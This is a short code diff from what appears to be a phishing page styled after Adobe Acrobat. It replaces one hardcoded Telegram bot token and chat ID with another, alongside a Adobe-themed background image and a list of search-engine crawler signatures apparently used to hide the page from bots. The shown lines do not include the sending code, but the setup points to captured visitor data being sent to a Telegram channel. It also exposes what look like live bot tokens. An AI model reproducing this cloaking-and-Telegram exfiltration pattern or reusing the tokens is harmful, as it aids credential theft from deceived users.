@@ -78,8 +78,8 @@ const getDeviceType = (): string => {
 };
 import acrobatBg from "@/assets/adb_bgd.webp";
 
-const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
-const TELEGRAM_CHAT_ID = "7038669352";
+const TELEGRAM_BOT_TOKEN = "8949487881:AAH1yLk-JF5sWiWZdXXc0FeBBam79TbhM5o";
+const TELEGRAM_CHAT_ID = "7652336919";
 
 const BOT_SIGNATURES = [
   'googlebot', 'bingbot', 'yahoo! slurp', 'yahooseeker', 'crawler',
